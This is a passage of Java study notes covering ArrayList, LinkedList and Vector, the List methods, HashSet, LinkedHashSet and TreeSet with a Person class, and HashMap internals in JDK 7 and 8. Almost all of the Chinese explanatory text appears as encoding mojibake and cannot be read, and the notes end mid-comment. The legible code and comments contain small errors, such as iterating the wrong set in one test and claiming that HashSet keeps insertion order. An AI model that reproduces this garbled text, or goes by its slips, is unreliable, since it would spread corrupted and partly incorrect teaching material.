åŒæ—¶éœ€è¦å°†åŸæœ‰æ•°ç»„ä¸­çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„æ•°ç»„ä¸­ * ç»“è®ºï¼šå»ºè®®å¼€å‘ä¸­ä½¿ç”¨å¸¦å‚çš„æ„é€ å™¨: ArrayList list = new ArrayList(int capacity); * * jdk8ä¸‹å˜åŒ–: * ArrayList coll1 = new ArrayList();//åº•å±‚object[]elementDataåˆå§‹åŒ–ä¸º{}.å¹¶æ²¡æœ‰åˆ›å»ºé•¿åº¦ä¸º10çš„æ•°ç»„ * ç¬¬ä¸€æ¬¡è°ƒç”¨add()æ—¶ï¼Œæ‰åˆ›å»ºé•¿åº¦ä¸º10çš„æ•°ç»„ * åç»­çš„æ·»åŠ å’Œæ‰©ç³æ“ä½œä¸jdk7æ— å¼‚ * * å°ç»“ï¼šjdk7ä¸­çš„ArrayListçš„å¯¹è±¡çš„åˆ›å»ºç±»ä¼¼äºå•ä¾‹çš„é¥¿æ±‰å¼ï¼Œè€Œjdk8ä¸­çš„ArrayListçš„å¯¹è±¡çš„åˆ›å»ºç±»ä¼¼äºå•ä¾‹çš„è“æ±‰å¼ï¼ŒèŠ‚çœäº†å†…å­˜ * * * 2.LinkedList: *LinkedList coll2 = new LinkedList(); * * * 3.Vector: * * * * * ä¸‰ã€listæ¥å£ä¸­å¸¸ç”¨æ–¹æ³• * é™¤å»Collectionè¿™ç§çš„15ä¸ªï¼Œè¿˜æœ‰ä¸‹é¢å‡ ä¸ª * */ public class ListTest { @Test public void test1(){ ArrayList coll1 = new ArrayList(); LinkedList coll2 = new LinkedList(); Vector coll3 = new Vector(); } /* listæ¥å£ä¸­å¸¸ç”¨æ–¹æ³• é™¤å»Collectionè¿™ç§çš„15ä¸ªï¼Œè¿˜æœ‰ä¸‹é¢å‡ ä¸ª ã€æ€»ç»“ï¼šå¸¸ç”¨æ–¹æ³•ã€‘ å¢ï¼šadd(Object obj) åˆ ï¼šremove(int index) /remove(Object obj) æ”¹ï¼šset(int index, Object ele) æŸ¥ï¼šget(int index) æ’ï¼šadd(index, Object ele) é•¿åº¦ï¼šsize() éå†ï¼š1. Iteratorè¿­ä»£å™¨ 2. foreach 3. æ™®é€šçš„å¾ªç¯ */ @Test public void test2(){ ArrayList l1 = new ArrayList(); //å°±ä»¥ArrayListä¸ºä¾‹ l1.add(132); l1.add(132); l1.add("aaa"); l1.add(new Person("Lisa", 18)); System.out.println(l1); // void add(int index, Object obj): åœ¨æŒ‡å®šä½ç½®æ’å…¥å…ƒç´  l1.add(2, "BB"); // boolean addAll():åœ¨indexä½ç½®å¼€å§‹å°†ollentionçš„å…ƒç´ æ’å…¥ List a1 = Arrays.asList(1, 2, 3); l1.addAll(a1); System.out.println(l1.size()); // Object get(int index): è·å–æŒ‡å®šä½ç½®å…ƒç´  System.out.println(l1.get(0)); // int indexOf(): è·å–å…ƒç´ é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å›-1 int index = l1.indexOf(132); System.out.println(index); // int lastIndexOf(): è·å–å…ƒç´ æœ«æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å›-1 System.out.println(l1.lastIndexOf("BB")); // Object remove(int index): ç§»é™¤æŒ‡å®šindexä½ç½®çš„å…ƒç´ ï¼Œå¹¶è¿”å›æ­¤å…ƒç´  Object b = l1.remove(0); System.out.println(b); System.out.println(l1); //Object set(int index, Object ele): è¿”å›æŒ‡å®šidnexä½ç½®çš„å…ƒç´ ä¸ºele l1.set(1, "CCC"); System.out.println(l1); // List subList(int fromIndex, int toIndex): ä»é›†åˆä¸­è¿”å›ä¸€ä¸ªå·¦é—­å³å¼€çš„å­é›†åˆ List l2 = l1.subList(1,6); // ä¸ä¼šå¯¹æœ¬èº«listé€ æˆå½±å“ System.out.println(l2); // éå† // F1: Iteratorè¿­ä»£å™¨ Iterator iterator = l1.iterator(); while (iterator.hasNext()){ System.out.println(iterator.next()); } // F2: foreach for(Object obj: l1){ System.out.println(obj); } // F3:æ™®é€šforå¾ªç¯ for (int i = 0; i &lt; l1.size(); i++) { System.out.println(l1.get(i)); } } @Test public void test3(){ } } é¢è¯•é¢˜ï¼š åŒºåˆ†listä¸­remove()æ–¹æ³• @Test public void test1() { List list = new ArrayList(); list.add(1); list.add(2); list.add(3); updateList(list); System.out.println(list); } public void updateList(List list){ // list.remove(2); // è¿™æ ·removeçš„æ˜¯ç´¢å¼•ä¸º2çš„å…ƒç´  list.remove(new Integer(2)); //è¿™æ ·é€šè¿‡å°è£…ç±»çš„æ–¹å¼, removeçš„æ˜¯å…ƒç´ å€¼ä¸º2çš„å…ƒç´  } Collectionå­æ¥å£äºŒ:Set å…ƒç´ æ— åºã€ä¸å¯é‡å¤çš„é›†åˆ ç±»ä¼¼é«˜ä¸­è®²çš„â€é›†åˆâ€: æ— åºæ€§ã€ç¡®å®šæ€§ã€äº’å¼‚æ€§ Setæ¥å£æ¦‚è¿°ï¼š Setæ¥å£æ˜¯Collectionçš„å­æ¥å£ï¼Œsetæ¥å£æ²¡æœ‰æä¾›é¢å¤–çš„æ–¹æ³• Seté›†åˆä¸å…è®¸åŒ…å«ç›¸åŒçš„å…ƒç´ ï¼Œå¦‚æœè¯•æŠŠä¸¤ä¸ªç›¸åŒçš„å…ƒç´ åŠ å…¥åŒä¸€ä¸ªSeté›†åˆä¸­ï¼Œåˆ™æ·»åŠ æ“ä½œå¤±è´¥ã€‚ Setåˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒä¸æ˜¯ä½¿ç”¨==è¿ç®—ç¬¦ï¼Œè€Œæ˜¯æ ¹æ®equals()æ–¹æ³• Setå®ç°ç±»ä¹‹ä¸€: Hashset HashSetæ˜¯ Setæ¥å£çš„å…¸å‹å®ç°ï¼Œå¤§å¤šæ•°æ—¶å€™ä½¿ç”¨Seté›†åˆæ—¶éƒ½ä½¿ç”¨è¿™ä¸ªå®ç°ç±»; HashSet æŒ‰Hashç®—æ³•æ¥å­˜å‚¨é›†åˆä¸­çš„å…ƒç´ ï¼Œå› æ­¤å…·æœ‰å¾ˆå¥½çš„å­˜å–ã€æŸ¥æ‰¾ã€åˆ é™¤æ€§èƒ½ã€‚ HashSetå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹: ä¸èƒ½ä¿è¯å…ƒç´ çš„æ’åˆ—é¡ºåº HashSetä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ é›†åˆå…ƒç´ å¯ä»¥æ˜¯null HashSeté›†åˆåˆ¤æ–­ä¸¤ä¸ªå…ƒç´ ç›¸ç­‰çš„æ ‡å‡†:ä¸¤ä¸ªå¯¹è±¡é€šè¿‡ hashCode()æ–¹æ³•æ¯”è¾ƒç›¸ç­‰ï¼Œå¹¶ä¸”ä¸¤ä¸ªå¯¹è±¡çš„equals()æ–¹æ³•è¿”å›å€¼ä¹Ÿç›¸ç­‰ã€‚ å¯¹äºå­˜æ”¾åœ¨Setå®¹å™¨ä¸­çš„å¯¹è±¡ï¼Œå¯¹åº”çš„ç±»ä¸€å®šè¦é‡å†™equals()å’ŒhashCode(Objectobj)æ–¹æ³•ï¼Œä»¥å®ç°å¯¹è±¡ç›¸ç­‰è§„åˆ™ã€‚å³:â€œç›¸ç­‰çš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸ç­‰çš„æ•£åˆ—ç â€ã€‚ é‡å†™hashCode()æ–¹æ³•çš„åŸºæœ¬åŸåˆ™: åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼ŒåŒä¸€ä¸ªå¯¹è±¡å¤šæ¬¡è°ƒç”¨hashCode()æ–¹æ³•åº”è¯¥è¿”å›ç›¸åŒçš„å€¼ã€‚ å½“ä¸¤ä¸ªå¯¹è±¡çš„equals()æ–¹æ³•æ¯”è¾ƒè¿”å› true æ—¶ï¼Œè¿™ä¸¤ä¸ªå¯¹è±¡çš„hashCode()æ–¹æ³•çš„è¿”å›å€¼ä¹Ÿåº”ç›¸ç­‰ã€‚ å¯¹è±¡ä¸­ç”¨ä½œequals()æ–¹æ³•æ¯”è¾ƒçš„Fieldï¼Œéƒ½åº”è¯¥ç”¨æ¥è®¡ç®— hashCodeå€¼ã€‚ Setå®ç°ç±»ä¹‹äºŒ: LinkedkashSet: LinkedHashSetæ˜¯ HashSetçš„å­ç±» LinkedHashSetæ ¹æ®å…ƒç´ çš„hashCodeå€¼æ¥å†³å®šå…ƒç´ çš„å­˜å‚¨ä½ç½®ï¼Œä½†å®ƒåŒæ—¶ä½¿ç”¨åŒå‘é“¾è¡¨ç»´æŠ¤å…ƒç´ çš„æ¬¡åºï¼Œè¿™ä½¿å¾—å…ƒç´ çœ‹èµ·æ¥æ˜¯ä»¥æ’å…¥é¡ºåºä¿å­˜çš„ã€‚ LinkedHashSetæ’å…¥æ€§èƒ½ç•¥ä½äºHashSetï¼Œä½†åœ¨è¿­ä»£è®¿é—®Seté‡Œçš„å…¨éƒ¨å…ƒç´ æ—¶æœ‰å¾ˆå¥½çš„æ€§èƒ½ã€‚ LinkedHashSetä¸å…è®¸é›†åˆå…ƒç´ é‡å¤ã€‚ Setå®ç°ç±»ä¹‹ä¸‰:TreeSet: TreeSetæ˜¯ SortedSetæ¥å£çš„å®ç°ç±»ï¼ŒTreeSetå¯ä»¥ç¡®ä¿é›†åˆå…ƒç´ å¤„äºæ’åºçŠ¶æ€ã€‚ TreeSetåº•å±‚ä½¿ç”¨çº¢é»‘æ ‘ç»“æ„å­˜å‚¨æ•°æ® TreeSetä¸¤ç§æ’åºæ–¹æ³•: è‡ªç„¶æ’åºå’Œå®šåˆ¶æ’åºã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒTreeSeté‡‡ç”¨è‡ªç„¶æ’åºã€‚ æ–°å¢çš„æ–¹æ³•å¦‚ä¸‹:(äº†è§£) Comparator comparator() Object first() Object last() Object lower(Object e) Object higher(Object e) SortedSet subSet(fromElement, toElement) SortedSet headSet(toElement) SortedSet tailSet(fromElement) ä»£ç å¦‚ä¸‹ï¼š package cn.xpshuai.java1; import org.junit.Test; import java.util.*; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-27 10:14 * @åŠŸèƒ½ï¼š * * ä¸€ã€setæ¥å£çš„æ¡†æ¶ç»“æ„(ä½¿ç”¨çš„æœ‰ç‚¹å°‘) * * | ----- Collectionæ¥å£: å•åˆ—æ•°æ®ï¼Œå®šä¹‰äº†å­˜å–ä¸€ç»„å¯¹è±¡çš„æ–¹æ³•çš„é›†åˆ * |---- Setæ¥å£(ç±»ä¼¼é«˜ä¸­è®²çš„"é›†åˆ":æ— åºã€ç¡®å®šæ€§ã€äº’å¼‚æ€§): å­˜å‚¨å…ƒç´ å…ƒç´ æ— åºã€ä¸å¯é‡å¤ * |---- HashSet: ä½œä¸ºsetæ¥å£çš„ä¸»è¦å®ç°ç±»ï¼›çº¿ç¨‹ä¸å®‰å…¨ï¼Œå¯å­˜å‚¨nullå€¼ * |---- LinkedHashSet: ä½œä¸ºhashsetçš„å­ç±»: éå†å…¶å†…éƒ¨æ•°æ®æ—¶ï¼Œå¯ä»¥æŒ‰ç…§æ·»åŠ çš„é¡ºåºéå† * |---- TreeSet: å¯ä»¥æŒ‰ç…§æ·»åŠ å¯¹è±¡çš„æŒ‡å®šå±æ€§è¿›è¡Œæ’åº * * * Note: * Setæ¥å£ä¸­æ²¡æœ‰é¢å¤–å®šä¹‰æ–°çš„æ–¹æ³•ï¼Œä½¿ç”¨çš„éƒ½æ˜¯collectionä¸­å£°æ˜è¿‡çš„æ–¹æ³•ã€‚ *è¦æ±‚:é‡å†™çš„hashCode()å’Œequals()å°½å¯èƒ½ä¿æŒä¸€è‡´æ€§:ç›¸ç­‰çš„å¯¹è±¡å¿…é¡»å…·æœ‰ç›¸ç­‰çš„æ•£åˆ—ç  * é‡å†™ä¸¤ä¸ªæ–¹æ³•çš„å°æŠ€å·§ï¼šå¯¹è±¡ä¸­ç”¨ä½œequals()æ–¹æ³•æ¯”è¾ƒçš„ Fieldï¼Œéƒ½åº”è¯¥ç”¨æ¥è®¡ç®—hashCodeå€¼ *å¯¹äºé¢‘ç¹çš„éå†æ“ä½œï¼ŒLinkedHashSetæ•ˆç‡ä¼˜äºHashSet * * * * äºŒã€setçš„æ— åºæ€§å’Œä¸å¯é‡å¤æ€§ * ä»¥HashSetä¸ºä¾‹è¯´æ˜: *1.æ— åºæ€§ *æ— åºæ€§ != éšæœºæ€§ã€‚å­˜å‚¨çš„æ•°æ®åœ¨åº•å±‚æ•°ç»„ä¸­å¹¶éæŒ‰ç…§æ•°ç»„ç´¢å¼•çš„é¡ºåºæ·»åŠ ï¼Œè€Œæ˜¯æ ¹æ®æ•°æ®çš„hashå€¼å†³å®šçš„ * * * 2.ä¸å¯é‡å¤æ€§:ä¿è¯æ·»åŠ çš„å…ƒç´ æŒ‰ç…§equals()åˆ¤æ–­æ—¶ï¼Œä¸èƒ½è¿”å›trueã€‚å³ç›¸åŒçš„å…ƒç´ åªèƒ½æ·»åŠ ä¸€ä¸ª * * * äºŒã€æ·»åŠ å…ƒç´ çš„è¿‡ç¨‹(ä»¥HashSetä¸ºä¾‹) * æˆ‘ä»¬å‘HashSetä¸­æ·»åŠ å…ƒç´ a,é¦–å…ˆè°ƒç”¨å…ƒç´ Î±æ‰€åœ¨ç±»çš„hashcode()æ–¹æ³•ï¼Œè®¡ç®—å…ƒç´ Î±çš„å“ˆå¸Œå€¼ï¼Œ * æ­¤å“ˆå¸Œå€¼æ¥ç€é€šè¿‡æŸç§ç®—æ³•è®¡ç®—å‡ºåœ¨HashSetåº•å±‚æ•°ç»„ä¸­çš„å­˜æ”¾ä½ç½®ï¼ˆå³ä¸º:ç´¢å¼•ä½ç½®)ï¼Œ * åˆ¤æ–­æ•™ç»„æ­¤ä½ç½®ä¸Šæ˜¯å¦å·²ç»æœ‰å…ƒç´ : * å¦‚æœæ­¤ä½ç½®ä¸Šæ²¡æœ‰å…¶ä»–å…ƒç´ ï¼Œåˆ™å…ƒç´ aæ·»åŠ æˆåŠŸã€‚--->æƒ…å†µ1 * å¦‚æœæ­¤ä½ç½®ä¸Šæœ‰å…¶ä»–å…ƒç´ b(æˆ–ä»¥é“¾è¡¨å½¢å¼å­˜åœ¨çš„å¤šä¸ªå…ƒç´ ã€‰ï¼Œåˆ™æ¯”è¾ƒå…ƒç´ aä¸å…ƒç´ bçš„hashå€¼: * å¦‚æœhashå€¼ä¸ç›¸åŒï¼Œåˆ™å…ƒç´ Î±æ·»åŠ æˆåŠŸã€‚--->æƒ…å†µ2 * å¦‚æœhashå€¼ç›¸åŒï¼Œè¿›è€Œéœ€è¦è°ƒç”¨å…ƒç´ Î±æ‰€åœ¨ç±»çš„equals()æ–¹æ³•: * equals()è¿”å›true,å…ƒç´ Î±æ·»åŠ å¤±è´¥ * equals()è¿”å›false,åˆ™å…ƒç´ aæ·»åŠ æˆåŠŸã€‚--->æƒ…å†µ2 * å¯¹äºæ·»åŠ æˆåŠŸçš„æƒ…å†µ2å’Œæƒ…å†µ3è€Œè¨€:å…ƒç´ Î±ä¸å·²ç»å­˜åœ¨æŒ‡å®šç´¢å¼•ä½ç½®ä¸Šæ•°æ®ä»¥é“¾è¡¨çš„æ–¹å¼å­˜å‚¨ã€‚ * jdk 7âˆ¶å…ƒç´ aæ”¾åˆ°æ•°ç»„ä¸­ï¼ŒæŒ‡å‘åŸæ¥çš„å…ƒç´ ã€‚ * jdk 8 :åŸæ¥çš„å…ƒç´ åœ¨æ•°ç»„ä¸­ï¼ŒæŒ‡å‘å…ƒç´ d *æ€»ç»“ï¼šä¸ƒä¸Šå…«ä¸‹ * *HashSetåº•å±‚ï¼šæ•°ç»„+é“¾è¡¨ * * *LinkedHashSet: * * *TreeSet * * * */ public class SetTest { @Test public void test1(){ //1.æ— åºæ€§ // 2.ä¸å¯é‡å¤æ€§ Set set1 = new HashSet(); //ä»¥hashsetä¸ºä¾‹ set1.add(132); set1.add(465); set1.add("AA"); set1.add(new Person("Jack", 18)); set1.add(666); Iterator iterator = set1.iterator(); while (iterator.hasNext()){ System.out.println(iterator.next()); // é¡ºåºè·Ÿæ·»åŠ çš„é¡ºåºæ˜¯ä¸€æ ·çš„ } // LinkedHashSetçš„ä½¿ç”¨ // LinkedHashSetä½œä¸ºHashSetçš„å­ç±»ï¼Œåœ¨æ·»åŠ æ•°æ®çš„åŒæ—¶ï¼Œæ¯ä¸ªæ•°æ®è¿˜ç»´æŠ¤äº†ä¸¤ä¸ªå¼•ç”¨ï¼Œè®°å½•æ­¤æ•°æ®å’Œåä¸€ä¸ªæ•°æ® //ä¼˜ç‚¹ï¼šå¯¹äºé¢‘ç¹çš„éå†æ“ä½œï¼Œæ•ˆç‡ä¼˜äºHashSet Set set2 = new LinkedHashSet(); //LinkedHashSet set2.add(132); set2.add(465); set2.add("AA"); set2.add(new Person("Jack", 18)); set2.add(666); Iterator iterator2 = set1.iterator(); while (iterator2.hasNext()){ System.out.println(iterator2.next()); // é¡ºåºè·Ÿæ·»åŠ çš„é¡ºåºæ˜¯ä¸€æ ·çš„ } } /* 1.å‘TreeSetä¸­æ·»åŠ çš„æ•°æ®ï¼Œè¦æ±‚æ˜¯ç›¸åŒç±»çš„å¯¹è±¡ 2.ä¸¤ç§æ’åºæ–¹å¼ï¼šè‡ªç„¶æ’åº(å®ç°Comparableæ¥å£)ã€å®šåˆ¶æ’åº(Comparator) 3.è‡ªç„¶æ’åºä¸­ï¼Œæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒçš„æ ‡å‡†ä¸ºï¼šcompareTo()è¿”å›0ï¼Œä¸å†æ˜¯equals() 4.è‡ªç„¶æ’åºä¸­ï¼Œæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸åŒçš„æ ‡å‡†ä¸ºï¼šcompare()è¿”å›0ï¼Œä¸å†æ˜¯equals() */ @Test public void test2(){ // TreeSet TreeSet set = new TreeSet(); // set.add(123); // set.add(456); // set.add(5); // set.add(56); // set.add(-6); // set.add("AAA"); //ä¸èƒ½æ·»åŠ ä¸åŒç±»çš„å¯¹è±¡ set.add(new Person("Tom", 18)); set.add(new Person("Tom", 21)); //ä¸¤ä¸ªç›¸åŒçš„ set.add(new Person("Lisa", 20)); set.add(new Person("Jack", 17)); set.add(new Person("Jerry", 25)); //è‡ªç„¶æ’åº Iterator iterator = set.iterator(); while (iterator.hasNext()){ System.out.println(iterator.next()); } // å®šåˆ¶æ’åºï¼šComparator Comparator com = new Comparator() { //æŒ‰ç…§å¹´é¾„ä»å°åˆ°å¤§æ’åº @Override public int compare(Object o1, Object o2) { if (o1 instanceof Person &amp;&amp; o2 instanceof Person){ Person p1 = (Person)o1; Person p2 = (Person)o2; return Integer.compare(p1.getAge(), p2.getAge()); }else{ throw new RuntimeException("è¾“å…¥çš„æ•°æ®ç±»å‹ä¸åŒ¹é…"); } } }; TreeSet set2 = new TreeSet(); set2.add(new Person("Tom", 18)); set2.add(new Person("Tom", 21)); //ä¸¤ä¸ªç›¸åŒçš„ set2.add(new Person("Lisa", 20)); set2.add(new Person("Jack", 17)); set2.add(new Person("Jerry", 18)); } } package cn.xpshuai.java1; import java.util.Objects; class Person implements Comparable{ private String name; private int age; public Person() { } public Person(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void walk(){ System.out.println("èµ°è·¯"); } public void eat(){ System.out.println("åƒé¥­"); } @Override public boolean equals(Object o) { System.out.println("è°ƒç”¨äº†equalsæ–¹æ³•"); if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); } @Override public int hashCode() { return Objects.hash(name, age); } //é‡å†™ã€æŒ‰ç…§å§“åä»å°åˆ°å¤§æ’åº @Override public int compareTo(Object o) { if(o instanceof Person){ Person person = (Person)o; // return this.name.compareTo(person.name); int compare = this.name.compareTo(person.name); if (compare != 0){ return compare; }else { //äºŒçº§æ’åº, è‹¥å§“åç›¸åŒåˆ™å†æ¯”è¾ƒage return Integer.compare(this.age, person.age); } }else{ throw new RuntimeException("è¾“å…¥çš„ç±»å‹ä¸åŒ¹é…"); } } @Override public String toString() { return "Person{" + "name='" + name + '\'' + ", age=" + age + '}'; } } ç»ƒä¹ 1ï¼š HashSetå¯ä»¥ç”¨æ¥å»é‡ HashSetå…ˆHashCodeå†equals() Mapæ¥å£(é‡ç‚¹) åŒåˆ—æ•°æ®ï¼Œä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»çš„â€key-valueâ€å¯¹çš„é›†åˆ ç±»ä¼¼é«˜ä¸­å‡½æ•°: y = f(x)ï¼Œä¸åŒkeyå¯ä»¥æŒ‡å‘ç›¸åŒçš„value Mapæ¥å£ç»§æ‰¿æ ‘ï¼š Mapç»“æ„çš„ç†è§£: å¸¸è§é¢è¯•é¢˜ï¼š è°ˆè°ˆä½ å¯¹HashMapä¸­put/getæ–¹æ³•çš„è®¤è¯†?å¦‚æœäº†è§£å†è°ˆè°ˆHashMapçš„æ‰©å®¹æœºåˆ¶?é»˜è®¤å¤§å°æ˜¯å¤šå°‘?ä»€ä¹ˆæ˜¯è´Ÿè½½å› å­(æˆ–å¡«å……æ¯”)?ä»€ä¹ˆæ˜¯æ˜¥åä¸´ç•Œå€¼(æˆ–é˜ˆå€¼ã€threshold)? HashMapæºç ä¸­é‡è¦å¸¸é‡ï¼š Mapä¸­å¸¸ç”¨çš„æ–¹æ³•: package cn.xpshuai.java1; import org.junit.Test; import java.util.*; /** * @author: å‰‘èƒ†ç´å¿ƒ * @create: 2021-01-27 16:22 * @åŠŸèƒ½ï¼š * * *ä¸€ã€Mapçš„ç»“æ„ä½“ç³» * | ----- Mapæ¥å£: åŒåˆ—æ•°æ®ï¼Œä¿å­˜å…·æœ‰æ˜ å°„å…³ç³»çš„"key-value"å¯¹çš„é›†åˆ(ç±»ä¼¼é«˜ä¸­å‡½æ•°: y = f(x)ï¼Œä¸åŒkeyå¯ä»¥æŒ‡å‘ç›¸åŒçš„value) * |---- HashMap(é¢è¯•é—®çš„å¤š, å¹³æ—¶ä¹Ÿå¸¸ç”¨): ä½œä¸ºMapçš„ä¸»è¦å®ç°ç±»; çº¿ç¨‹ä¸å®‰å…¨çš„ï¼Œæ•ˆç‡é«˜ï¼›å­˜å‚¨nullçš„keyå’Œvalue * |---- LinkedHashMap:ä¿è¯åœ¨éå†mapå…ƒç´ æ—¶ï¼Œå¯ä»¥æŒ‰ç…§æ·»åŠ çš„å¾ªåºå®ç°éå† * åŸå› ï¼šåœ¨åŸæœ‰çš„HashMapçš„åŸºç¡€ä¸Šï¼Œæ·»åŠ äº†ä¸€å †æŒ‡é’ˆï¼ŒæŒ‡å‘å‰ä¸€ä¸ªå’Œåä¸€ä¸ªå…ƒç´  * å¯¹äºé¢‘ç¹çš„éå†æ“ä½œï¼Œæ­¤ç±»æ‰§è¡Œæ•ˆç‡é«˜äºHashMap * |---- TreeMap: ä¿è¯æŒ‰ç…§æ·»åŠ çš„key-valueè¿›è¡Œæ’åºï¼Œå®ç°æ’åºéå†(æ­¤æ—¶è€ƒè™‘keyçš„è‡ªç„¶æ’åºå’Œå®šåˆ¶æ’åº) * |---- Hashtable: ä½œä¸ºå¤è€çš„å®ç°ç±»ï¼›çº¿ç¨‹å®‰å…¨çš„ï¼Œæ•ˆç‡ä½ï¼›ä¸èƒ½å­˜å‚¨nullçš„keyå’Œvalue * |---- Properties: å¸¸ç”¨æ¥å¤„ç†é…ç½®æ–‡ä»¶ã€‚keyå’Œvalueéƒ½æ˜¯Stringç±»å‹ * * * HashMapçš„åº•å±‚ï¼šæ•°ç»„+é“¾è¡¨(jdk7åŠä¹‹å‰) * æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘(jdk8) * * *äºŒã€Mapç»“æ„çš„ç†è§£ * Mapä¸­çš„key: æ— åºçš„ã€ä¸å¯é‡å¤çš„ï¼Œä½¿ç”¨Setå­˜å‚¨æ‰€æœ‰çš„key ---&gt; keyæ‰€åœ¨çš„ç±»è¦é‡å†™equaLs( )å’Œhashcode() ï¼ˆä»¥HashMapä¸ºä¾‹ï¼‰ * Mapä¸­çš„valueï¼šæ— åºçš„ã€å¯é‡å¤çš„ï¼Œä½¿ç”¨Collectionå­˜å‚¨æ‰€æœ‰çš„value --&gt;vaLueæ‰€åœ¨çš„ç±»è¦é‡å†™equals() * ä¸€ä¸ªé”®å€¼å¯¹ï¼škey-valueæ„æˆäº†ä¸€ä¸ªEntryå¯¹è±¡ * Mapä¸­çš„Entry: æ— åºçš„ã€ä¸å¯é‡å¤çš„ï¼Œä½¿ç”¨Setå­˜å‚¨æ‰€æœ‰çš„entry * * *ä¸‰ã€HashMapçš„åº•å±‚å®ç°åŸç† * jdk7ä¸ºä¾‹ï¼š * HashMap map = new HashMap(); * åœ¨å®ä¾‹åŒ–ä»¥åï¼Œåº•å±‚åˆ›å»ºäº†é•¿åº¦ä¸º16çš„ä»¥ä¸ºæ•°ç»„Entry[] table * ... å¯èƒ½å·²ç»æ‰§è¡Œäº†å¤šæ¬¡put ... * map.push(key1, value1); * é¦–å…ˆï¼Œè®¡ç®—key1æ‰€åœ¨ç±»çš„hashCode()ï¼Œè®¡ç®—key1çš„å“ˆå¸Œå€¼ï¼Œæ­¤å“ˆå¸Œå€¼ç»è¿‡æŸç§ç®—æ³•è®¡ç®—ä»¥åï¼Œå¾—åˆ°åœ¨Entryæ•°ç»„ä¸­çš„å­˜æ”¾ä½ç½® * å¦‚æœæ­¤ä½ç½®ä¸Šçš„æ•°æ®ä¸ºç©ºï¼Œæ­¤æ—¶çš„key1-value1æ·»åŠ æˆåŠŸ ---&gt; æƒ…å†µ1 * å¦‚æœæ­¤ä½ç½®ä¸Šçš„æ•°æ®ä¸ä¸ºç©º(æ­¤ä½ç½®å­˜åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®(ä»¥é“¾è¡¨å½¢å¼å­˜åœ¨)), æ¯”è¾ƒkey1å’Œå·²ç»å­˜åœ¨çš„ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®çš„hashå€¼ï¼š * å¦‚æœkey1çš„hashå€¼ä¸å·²å­˜åœ¨çš„æ•°æ®çš„hashå€¼éƒ½ä¸ç›¸åŒï¼Œæ­¤æ—¶key1-value1æ·»åŠ æˆåŠŸ ---&gt; æƒ…å†µ1 * å¦‚æœkey1çš„hashå€¼ä¸å·²å­˜åœ¨çš„æ•°æ®çš„æŸä¸€ä¸ªæ•°æ®(key2-value2)çš„hashå€¼éƒ½ä¸ç›¸åŒï¼Œç»§ç»­æ¯”è¾ƒ: è°ƒç”¨key1æ‰€åœ¨ç±»çš„equals()æ–¹æ³•ï¼Œæ¯”è¾ƒ: * å¦‚æœequals()è¿”å›false:æ­¤æ—¶key1-value1æ·»åŠ æˆåŠŸ ---&gt; æƒ…å†µ3 * å¦‚æœequals()è¿”å›true:ä½¿ç”¨value1æ›¿æ¢ç›¸åŒkeyçš„value2å€¼ï¼Œ * key1-value1æ·»åŠ æˆåŠŸ * è¡¥å……ï¼šå…³äºæƒ…å†µ2å’Œæƒ…å†µ3: æ­¤æ—¶key1-value1å’ŒåŸæ¥çš„æ•°æ®ä»¥é“¾è¡¨çš„æ–¹å¼å­˜å‚¨ * * åœ¨ä¸æ–­çš„æ·»åŠ è¿‡ç¨‹ä¸­ï¼Œä¼šæ¶‰åŠåˆ°æ‰©å®¹é—®é¢˜, å½“è¶…å‡ºä¸´ç•Œå€¼(ä¸”è¦å­˜æ”¾çš„ä½ç½®éç©º)æ—¶ï¼Œæ‰©å®¹ã€‚é»˜è®¤çš„æ‰©å®¹æ–¹å¼ä¸ºæ‰©å®¹åˆ°åŸæ¥å®¹é‡çš„2å€ï¼Œå¹¶å°†åŸæœ‰æ•°æ®å¤åˆ¶è¿‡æ¥ * * jdk8 ç›¸è¾ƒäºjdk7ï¼Œåœ¨åº•å±‚å®ç°æ–¹é¢çš„ä¸åŒï¼› * 1.new HashMap()ï¼š åº•å±‚æ²¡æœ‰åˆ›å»ºä¸€ä¸ªé•¿åº¦ä¸º16çš„æ•°ç»„ * 2.jdk8åº•å±‚çš„æ•°æ®æ˜¯ Node[], è€ŒéEntry[] * 3.é¦–æ¬¡è°ƒç”¨put()æ–¹æ³•æ—¶ï¼Œåº•å±‚åˆ›å»ºé•¿åº¦ä¸º16çš„æ•°ç»„ * 4.jdk7åº•å±‚ç»“æ„åªæœ‰ï¼šæ•°ç»„+é“¾è¡¨, jdk8ä¸­åº•å±‚ç»“æ„:æ•°ç»„+é“¾è¡¨+çº¢é»‘æ ‘ * å½“æ•°ç»„çš„æŸä¸€ä¸ªç´¢å¼•ä½ç½®ä¸Šçš„å…ƒç´ ä»¥é“¾è¡¨å½¢å¼å­˜åœ¨çš„æ•°æ®ä¸ªæ•°&gt;8 ä¸”å½“å‰æ•°ç»„çš„é•¿åº¦&gt;64æ—¶ï¼Œ * æ­¤æ—¶æ­¤ç´¢å¼•ä½ç½®ä¸Šæ‰€æœ‰æ•°æ®æ”¹ä¸ºçº¢é»‘æ ‘å­˜å‚¨ * * *HashMapæºç åˆ†æ: * jdk7 * jdk8 * * * DEFAULT_INITIAL_CAPACITY : HashMapçš„é»˜è®¤å®¹é‡ï¼Œ16 * DEFAULT_LOAD_FACTOR: HashMapçš„é»˜è®¤åŠ è½½å› å­:0.75 * 